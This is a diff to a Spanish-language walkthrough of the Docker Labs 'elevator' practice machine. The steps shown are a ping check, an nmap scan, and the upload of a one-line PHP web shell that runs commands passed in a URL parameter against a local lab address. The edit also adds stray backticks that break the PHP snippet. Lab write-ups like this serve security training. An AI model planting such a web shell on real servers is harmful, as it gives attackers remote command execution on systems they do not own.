@@ -1,7 +1,8 @@
 # Maquina elevator
 ---
-Primero verificamos si tenemos **ping** de la máquina de **Docker Labs**.
-![image](https://github.com/user-attachments/assets/ccf1913f-1090-4440-b19c-99c02fa464ea)
+Primero, verificamos la conectividad con la máquina utilizando **ping**:
+
+![Ping a la máquina objetivo](https://github.com/user-attachments/assets/ccf1913f-1090-4440-b19c-99c02fa464ea)
 
 Iniciamos la fase de reconocimiento de los puertos de dicha máquina con **NMAP**.
 ```bash
@@ -37,11 +38,11 @@ En la siguiente ruta `http://172.17.0.2/themes/archivo.html` encontramos un apar
 
 Vamos a proceder primero a crear un fichero con la extensión `.php`, por si la web permite subir dicho fichero. Si es así, podemos aprovechar esta vulnerabilidad para ganar acceso a la máquina.
 ```php
-<?php
+<?php``
     system($_GET['cmd'])
 ?>
 ```
-![image](https://github.com/user-attachments/assets/57d54f62-7969-4ec9-a289-9e174bace3c1)
+![image](https://github.com/user-attachments/assets/57d54f62-7969-4ec9-a289-9e174bace3c1)``
 
 Procedemos a subir el fichero a la web.
 ![image](https://github.com/user-attachments/assets/07a53adf-c045-479f-b990-8d25c1feaf38)
